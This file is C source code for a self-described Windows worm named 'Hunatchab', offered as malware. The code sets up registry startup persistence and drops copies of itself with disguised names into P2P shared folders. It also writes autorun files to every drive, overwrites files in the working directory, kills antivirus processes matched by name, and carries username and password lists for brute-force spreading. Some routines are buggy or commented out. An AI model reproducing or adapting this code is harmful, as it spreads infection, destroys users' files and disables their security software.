/*================================================================
   Undermine's Hunatchab Worm 
   http://undermine.bloger.hr
   Description:
      * Run at every startup
      * Infect drives & files
      * P2P Process
      * Taskkill av
Attempt to spread using predefined users/password list
great thanks :  Lim Ci,  Mar'i, Kevin and "Maja for everything".
==================================================================
  Your rights take full responsability of any  damage.
  The main reason for this virus is to show you how works,
  so this is why i added that variable. sorry for the mess but like i said 
  it's mostly to explain my virus.
  Peoples interessed in this technic should also rewrite DATA d32, in line  w32. 
  It also change register usage, but using a more advanced technic update taskkill.
  If you want update also username and password.
==================================================================*/
#include <windows.h>
#define FTP "myprivacy.t35.com/hunatcha/hunatcha.html" /*browser mozilla and any other */
#define PORT 21
#define FTP_USER "hunatcha" /*Worm Username*/
#define FTP_PASSWORD "hunatcha" /*Worm Password*/
#define USERS_NUM 46
#define PWD_NUM 70
#define VirSize	(9268+1)
#define LenID	(9+1)

const char *Inf_Drives[] = {"A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:",
"Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:",0};
const char *Taskkill[] = {"av","Av","AV","defend","Defend","DEFEND","f-","F-","defense","Defense","DEFENSE",
"Kaspersky","KASPERSKY","kaspersky","sophos","SOPHOS","Sophos","Scanner","SCANNER","scanner","Norton","norton",
"NORTON","Security","SECURITY","security","Anti","ANTI","anti","SCAN","Scan","scan","Malware","MALWARE","malware",
"Virus","VIRUS","virus","NOD32","nod32","Nod32","Zoner","ZONER","zoner","SECUR","Secur","secur","Dr.","DR.",0};
 
int InfectDrives(void);
int InfectFiles(void);
void AutoStart(char *authorpath);
void Payload(void);
void FindDirectory(LPCSTR DirPath);
void FillArray(LPCSTR Directory);
 
char DirArray[250000][MAX_PATH];
int dircount = 0;
char windir[MAX_PATH];
HKEY hKey;
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 int count;
 char wormpath[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, wormpath, 256);
 HKEY hKey;
 strcat(windir, "\\System32\\update.exe");
 CopyFile(wormpath, windir, 0);


 RegCreateKey (HKEY_CURRENT_USER, "Software\\undermine", &hKey);
 RegSetValueEx (hKey, "Hunatcha", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\InternetRegistry",&hKey);
 RegSetValueEx (hKey, "Hunatcha", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Undermine",&hKey);
 RegSetValueEx (hKey, "Explorer", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "Hunatcha", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER,"Software\\Classes\\irc\\Shell\\open\\command", &hKey);
 RegSetValueEx (hKey, "Send", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, ".Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", &hKey);
 RegSetValueEx (hKey, "Send", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Kazaa\\Transfer", &hKey);
 RegSetValueEx (hKey, "Upload", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 

 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc                    .exe", 0);
 CopyFile(wormpath, "C:\\WINDOWS\\system32\\inetsrv.dll                    .exe", 0);
 {
     count = count ^ 5;
 }
 return 0;
}
int NeverAntiVirus(void)
{
	int c;
	while(1) {
		for(c=0;Taskkill[c]!=0;c++) system((char *)&Taskkill[c]);
		Sleep(1000);
	}
	return 0;
}
int InfectDrives(void)
{
	char IFile[256], NewFile[256], Autorun[256], InfFile[256];
	GetSystemDirectory(IFile,sizeof(IFile));
	strcat(IFile,"\\updater.exe");
	int i;
	while(1) {
		for(i = 0; Inf_Drives[i]; i++) {
			memset(NewFile,'\0',sizeof(NewFile));
			memset(Autorun,'\0',sizeof(Autorun));
			memset(InfFile,'\0',sizeof(InfFile));
			strcpy(NewFile,Inf_Drives[i]);
			strcpy(Autorun,Inf_Drives[i]);
			strcat(NewFile,"\\allow.exe");
			strcat(Autorun,"\\autorun.inf");
			if(CopyFile(IFile,NewFile,FALSE)) {
			//	FILE *runfile = fopen(Autorun,"wb");
		    	sprintf(InfFile,"[autorun]\r\nopen=allow.exe\r\naction=Open folder to view files\r\n");
			//	fputs(InfFile,runfile);
			//	fclose(runfile);
				SetFileAttributes(NewFile,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
				SetFileAttributes(Autorun,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
			}
		}
		Sleep(2000);
	}
}
int InfectFiles(void)
{
	WIN32_FIND_DATA w32;
	HANDLE fHandle;
	char MyFile[256];
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
	if((fHandle = FindFirstFile("*.*",&w32))==INVALID_HANDLE_VALUE) return 1;
	else {
		if(w32.cFileName==MyFile) goto next;
		SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,w32.cFileName,FALSE);
        next:
		while(FindNextFile(fHandle,&w32)) {
			if(w32.cFileName==MyFile) continue;
			SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
			CopyFile(MyFile,w32.cFileName,FALSE);
		}
		FindClose(fHandle);
	}
	return 0;
}
void FindDirectory(LPCSTR DirPath)
{
     WIN32_FIND_DATA FindData;
     HANDLE hFind;
     char Path[MAX_PATH];
     hFind = FindFirstFile(DirPath, &FindData);
     do
     {
         strcpy(Path, DirPath);
         Path[strlen(DirPath)-1] = 0;
         strcat(Path, FindData.cFileName);

         if ((FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) && (strstr(FindData.cFileName,".")==0))
         {
           FillArray(Path);
           strcat(Path,"\\*");
           FindDirectory(Path);
         }

     } while (FindNextFile(hFind,&FindData));
     FindClose(hFind);
}

void FillArray(LPCSTR Directory)
{
     lstrcpy(DirArray[dircount],Directory);
     dircount++;
}
void Payload(void)
{
	char wormpath[MAX_PATH];
	GetModuleFileName(NULL, wormpath, MAX_PATH);
	strcat(windir, "\\System32\\update.exe");
	MessageBox (0, "Your system need to update my new world...", "Hunatcha Informer", MB_ICONINFORMATION | MB_OK);
}
/* Create spreading threads 
     CreateThread(NULL,0,&L0cal,authorpath,0,&ThreadID);
    
     while(!gethostbyname("myprivacy.t35.com")) * connected to internet? *
     {
		Sleep(1000*60*20);
	}
	
	CreateThread(NULL,0,&extra,authorpath,0,&ThreadID);

	GetSystemTime(&time);

	if(time.wHour % 2 == 0)
	{
		
		Payload();  * active payload ! *
	}
	
	Sleep(300);
}
*/
static char *users_list[] = {
	NULL,
	"admin",
	"zokili",
	"administrator",
	"jimmy",
	"guest",
	"root",
	"test",
	"plantaspont",
	"wwwadmin",
	"ucoz",
	"milan",
	"forum",
	"sindikat",
	"camel",
	"business",
	"enter",
	"muhamad",
	"welcome",
	"cetnik",
	"pajov",
	"jenna",
	"gaga",
	"melita",
	"beta",
	"deniz",
	"pantera",
	"nathan",
	"alpha",
	"mup",
	"mpek",
	"ultimate",
	"gaga",
	"network",
	"melissa",
	"ana",
	"pantera",
	"telenor",
	"gamer",
	"matrix",
	"stil",
	"public",
	"documents",
	"devil",
	"webmaster",
	"default"
};
static char *passwords_list[] = {
	 NULL,
	 "qwerty",
	 "veki",
	 "123",
	 "1234",
	 "12345",
	 "123456",
	 "1234567",
	 "12345678",
	 "123456789",
	 "1234567890",
	 "access",
	 "Orion",
	 "bob",
	 "billy",
	 "vesna",
	 "internet",
	 "dejan",
	 "bitch",
	 "data",
	 "database",
	 "home",
	 "server",
	 "login",
	 "guest",
	 "lucy",
	 "pass",
	 "pass1234",
	 "jenna",
	 "intruder",
	 "macro",
	 "enter",
	 "djindjic",
	 "winpass",
	 "root",
	 "web",
	 "user",
	 "test",
	 "gamer",
	 "lazar",
	 "skorpija",
	 "sex",
	 "sexy",
	 "oracle",
	 "mysql",
	 "061279",
	 "dekd5emgfa",
	 "evropa",
	 "hell",
	 "bloger",
	 "internet",
	 "boss",
	 "hacker",
	 "system",
	 "2012",
	 "fishbowl",
	 "zokili",
	 "shadow",
	 "index",
	 "abcd",
	 "123abc",
	 "qweerty",
	 "joker",
	 "euroserbia",
	 "euronet",
	 "milan",
	 "abcde",
	 "testing",
	 "start",
	 "space"
};

/* internal msg to avers */
static char *msg_to_avers = "Business maker!";
